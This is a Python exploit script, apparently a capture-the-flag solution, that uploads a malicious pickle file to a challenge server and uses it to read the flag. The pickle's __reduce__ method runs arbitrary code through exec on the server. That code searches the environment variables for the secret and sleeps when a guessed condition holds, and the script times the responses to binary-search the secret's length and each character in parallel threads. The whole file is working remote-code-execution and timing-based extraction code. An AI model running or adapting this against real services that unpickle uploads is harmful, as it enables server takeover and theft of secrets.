import pickle
import requests
import time
import sys
from concurrent.futures import ThreadPoolExecutor

URL = "http://instance.ctf.it.kmitl.ac.th:5029/submit"
SLEEP_TIME = 0.8  # Reduced from 1.5s
THRESHOLD = 0.5    # Reduced from 1.2s; typical latency is ~0.1s
MAX_THREADS = 10   # Adjust based on server stability

class Exploit:
    def __init__(self, cmd):
        self.cmd = cmd
    def __reduce__(self):
        return (exec, (self.cmd,))

def test_condition(cond):
    cmd = f"""
import os, time
flag = ""
for k, v in os.environ.items():
    if 'Cl@sh' in v:
        flag = v
        break
if {cond}:
    time.sleep({SLEEP_TIME})
"""
    # Use memory instead of disk
    payload = pickle.dumps(Exploit(cmd))
    
    start = time.time()
    try:
        # Pass bytes directly
        requests.post(URL, files={'model': ('model.pkl', payload)}, timeout=SLEEP_TIME + 2)
    except requests.exceptions.ReadTimeout:
        return True
    elapsed = time.time() - start
    return elapsed >= THRESHOLD

def get_char(index):
    low = 32
    high = 126
    while low <= high:
        mid = (low + high) // 2
        cond = f"ord(flag[{index}]) > {mid}"
        if test_condition(cond):
            low = mid + 1
        else:
            high = mid - 1
    return chr(low)

def main():
    print("[*] Finding flag length using binary search...")
    low_len = 1
    high_len = 100
    flag_len = 0
    
    # First find an upper bound if 100 isn't enough (though usually it is)
    if not test_condition("len(flag) <= 100"):
        print("[!] Flag is longer than 100 chars, adjusting...")
        high_len = 200
        
    while low_len <= high_len:
        mid = (low_len + high_len) // 2
        if test_condition(f"len(flag) >= {mid}"):
            flag_len = mid
            low_len = mid + 1
        else:
            high_len = mid - 1
            
    print(f"[+] Flag length identified: {flag_len}")
    
    if flag_len == 0:
        print("[-] Failed to find flag length.")
        return

    print(f"[*] Extracting {flag_len} characters in parallel with {MAX_THREADS} threads...")
    
    # We use a shared list to keep track of characters as they come in
    results = [None] * flag_len
    
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        # Submit each character position as a task
        future_to_index = {executor.submit(get_char, i): i for i in range(flag_len)}
        
        # As characters are found, update the display
        completed = 0
        for future in future_to_index:
            index = future_to_index[future]
            char = future.result()
            results[index] = char
            completed += 1
            
            # Print current state of the flag
            current_flag = "".join(c if c is not None else "_" for c in results)
            sys.stdout.write(f"\rProgress: [{current_flag}] ({completed}/{flag_len})")
            sys.stdout.flush()

    final_flag = "".join(results)
    print(f"\n\n[!] Success! Extracted Flag: {final_flag}")

if __name__ == "__main__":
    main()
